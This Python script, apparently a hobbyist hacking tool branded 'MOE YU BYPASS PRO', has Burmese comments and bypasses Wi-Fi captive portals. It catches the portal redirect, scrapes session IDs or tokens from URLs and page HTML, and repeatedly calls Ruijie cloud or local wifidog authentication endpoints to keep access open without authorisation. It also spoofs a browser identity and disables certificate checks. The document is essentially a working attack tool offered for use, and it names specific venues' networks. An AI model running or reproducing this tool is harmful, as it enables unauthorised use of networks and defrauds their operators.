import requests
import re
import urllib3
import time
import threading
import sys
import os
import uuid
import random
import socket
from urllib.parse import urlparse, parse_qs
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from rich.text import Text

# ===============================
# CONFIG & INITIALIZATION
# ===============================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

# အလွန်အကျွံမဖြစ်စေရန် (Connection Pool Full Fix)
PING_INTERVAL = 3.0 

GREEN = "\033[92m"
RED = "\033[91m"
CYAN = "\033[96m"
RESET = "\033[0m"

BABY_LOGO = """
[bold cyan]
      _      
    _(_)_    
   (_)@(_)   [white] <( Let's Play! )[/white]
     (_)\  / 
      /  ||  
  ___/___||___
 |____________|
[/bold cyan]
"""

BANNER = """
[bold #00FF00]
 ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
 ║║║║ ║║╣   ╚╦╝║ ║
 ╩ ╩╚═╝╚═╝   ╩ ╚═╝
      [#00FF00]M O E   Y U   H A C K E R[/#00FF00]
[/bold #00FF00]
"""

def get_current_gateway():
    """Socket ဖြင့် Gateway ကို တိကျစွာရှာဖွေခြင်း"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return ".".join(local_ip.split('.')[:-1]) + ".1"
    except:
        return "192.168.110.1"

def hacker_typing(text, style="bold green"):
    console.print("[bold #00FF00]>>> [/bold #00FF00]", end="")
    for char in text:
        console.print(Text(char, style=style), end="")
        sys.stdout.flush()
        time.sleep(0.02)
    console.print()

# ===============================
# BYPASS ENGINE (CLOUDFLARE/RUIJIE FIX)
# ===============================
def start_bypass_process():
    while True:
        try:
            # အဆင့်မြင့် Session ကို အသုံးပြုခြင်း
            session = requests.Session()
            session.headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Upgrade-Insecure-Requests": "1"
            })
            
            # ၁။ Google Connectivity Check မှတစ်ဆင့် Redirect ကို ဖမ်းယူခြင်း
            r = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10, allow_redirects=True)
            portal_url = r.url
            
            # ၂။ SID/Token ကို နေရာစုံတွင် ရှာဖွေခြင်း
            # URL Parameters ထဲတွင် ရှာခြင်း
            params = parse_qs(urlparse(portal_url).query)
            sid = (params.get('sessionId') or params.get('session_id') or 
                   params.get('token') or params.get('auth_id') or [None])[0]
            
            # HTML Page ထဲတွင် JavaScript Variable များအဖြစ် ရှာခြင်း
            if not sid:
                page_res = session.get(portal_url, timeout=10, verify=False)
                # Regex ဖြင့် sessionId သို့မဟုတ် token တန်ဖိုးကို နှိုက်ယူခြင်း
                sid_match = re.search(r'(?:sessionId|session_id|token|auth_id)["\']?\s?[:=]\s?["\']?([a-zA-Z0-9_\-]+)', page_res.text)
                sid = sid_match.group(1) if sid_match else None
            
            if sid:
                current_gw = get_current_gateway()
                
                # Ruijie Cloud (Cham Myae Thaw Tar) အတွက် သီးသန့် Auth Link
                if "ruijienetworks.com" in portal_url or "portal-as" in portal_url:
                    auth_link = f"https://portal-as.ruijienetworks.com/api/auth/login?sessionId={sid}"
                    mode = "RUIJIE-CLOUD"
                else:
                    # Local WiFi စနစ် (Zin Myo Aung, etc.)
                    auth_link = f"http://{current_gw}:2060/wifidog/auth?token={sid}"
                    mode = "LOCAL-BYPASS"
                
                def keep_alive():
                    while True:
                        try:
                            # Router ကို Request ပို့၍ Session အရှင်ထားခြင်း
                            session.get(auth_link, timeout=10, verify=False)
                            sys.stdout.write(f"{GREEN}[✓] {mode} | SID: {sid[:12]}.. | SUCCESS{RESET}\n")
                            sys.stdout.flush()
                        except: pass
                        time.sleep(PING_INTERVAL)

                threading.Thread(target=keep_alive, daemon=True).start()
                
                # အင်တာနက် အခြေအနေ စောင့်ကြည့်ခြင်း
                while True:
                    try:
                        if session.get("http://www.google.com", timeout=7).status_code == 200:
                            time.sleep(20)
                        else: break
                    except: break
            else:
                sys.stdout.write(f"{RED}[-] TARGET SID NOT FOUND. RETRYING...{RESET}\n")
                time.sleep(4)
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    console.clear()
    console.print(Align.center(BABY_LOGO))
    console.print(Align.center(BANNER))
    
    hwid = "MOE-998A7F92-675" # အစ်ကို့ရဲ့ HWID အမှန်
    console.print(Align.center(Panel(f"[bold white]YOUR HWID: [yellow]{hwid}[/yellow][/bold white]", border_style="cyan", expand=False)))
    
    hacker_typing("SCANNING NETWORK INTERFACE...")
    hacker_typing(f"DETECTED GATEWAY: {get_current_gateway()}") #
    hacker_typing("BYPASSING SECURITY PROTOCOLS...")
    
    console.print(Panel.fit("[bold red]🔥 MOE YU BYPASS PRO v7.8 ACTIVATED 🔥[/bold red]", border_style="white"))
    
    try:
        start_bypass_process()
    except KeyboardInterrupt:
        sys.exit()
